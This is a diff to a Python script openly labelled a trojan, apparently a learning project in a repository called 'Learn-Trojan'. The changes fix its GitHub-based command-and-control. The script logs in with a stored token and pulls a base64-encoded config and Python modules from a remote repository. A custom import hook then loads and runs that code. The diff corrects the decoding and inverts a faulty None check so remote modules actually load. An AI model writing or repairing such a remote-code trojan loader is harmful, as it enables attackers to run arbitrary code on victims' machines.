@@ -13,13 +13,17 @@ from datetime import datetime
 def github_connect():
     with open('mytoken.txt') as f:
         token = f.read()
-        user = 'ericardiansa'
+        user = 'EricArdiansa'
         sess = github3.login(token=token)
         return sess.repositories(user, 'Learn-Trojan')
 #function to get file contents from repositories
 def get_file_contents(dirname,module_name, repo):
-    return repo.file_contents(f'{dirname}/{module_name}').content
-
+    file_contents = repo.file_contents(f'{dirname}/{module_name}')
+    if file_contents:
+        return file_contents.decoded.decode()
+    else:
+        return None
+    
 #create trojan class to performs trojaning task
 #create trojan object
 class Trojan:
@@ -40,7 +44,7 @@ class Trojan:
             'config', self.config_file, self.repo
         )
         #load config data
-        config = json.loads(base64.b64decode(config_json))
+        config = json.loads(base64.b64decode(config_json.content))
 
         #checking module
         for task in config:
@@ -94,7 +98,7 @@ class GitImporter:
         print("[*]Attempting to retreiving %s" % name)
         self.repo = github_connect()
         new_library = get_file_contents('module', f'{name}.py', self.repo)
-        if new_library is None:
+        if new_library is not None:
             self.current_module_code = base64.b64decode(new_library)
             return self
     
